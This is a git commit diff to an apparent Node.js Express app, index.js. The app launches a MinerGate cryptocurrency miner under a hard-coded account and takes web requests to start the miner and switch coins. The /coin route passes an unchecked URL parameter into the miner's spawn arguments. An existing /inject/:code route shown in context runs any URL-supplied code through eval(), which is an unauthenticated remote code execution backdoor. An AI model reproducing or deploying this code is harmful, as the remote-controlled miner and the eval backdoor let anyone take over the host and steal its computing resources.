6e5f3cb1a198a1aa42711bd5bea6444f8dae5806
Th1nkFast <31682030+Th1nkFast@users.noreply.github.com>
2017-09-19 19:56:03 -0300

    Update index.js

--- index.js
+++ index.js
@@ -4,17 +4,20 @@ const app = express();
  
 var state = false;
 var proc = '';
-var coin = '-xmr';
+var coin = 'bcn';
 
 const start = ()=>{
     state = true;
-    proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', coin, '1']);
+    proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br',"-"+coin, '1']);
     proc.on('close', () => {
       console.log('child process exited');
       state = false;
     });
 }
-
+const restart = ()=>{
+    proc.kill('SIGINT');
+    return start();
+}
 
 app.listen(process.env.PORT || 8080, ()=>{
   console.log('Example app listening on port 3000!');
@@ -28,7 +31,8 @@ app.get('/start', function (req, res) {
 });
 app.get('/coin/:coin', function (req, res) {
   	coin = req.params.coin;
-    res.send('coin setted to: '+coin)
+   res.send('coin setted to: '+coin)
+   return restart();
 });
 app.get('/inject/:code', function (req, res) {
   	eval(req.params.code);
